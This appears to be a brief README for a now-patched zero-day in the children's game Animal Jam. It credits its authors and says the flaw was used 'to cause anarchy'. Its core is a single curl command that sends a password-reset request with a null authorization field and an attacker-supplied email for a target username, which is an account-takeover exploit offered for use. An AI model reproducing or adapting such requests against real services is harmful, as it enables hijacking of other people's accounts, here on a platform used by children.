## Animal Jam 0day

Now patched 0day for force reseting an accounts password

Discovered by MoonManMafia
Program made by HellSec

Used until patched to cause anarchy.

________________________________

```bash
curl -X POST -F 'authorization=null' -F 'email=youremail@test.com' https://api.animaljam.com/game_account/TARGET_USERNAME/send_password_reset/desktop
```

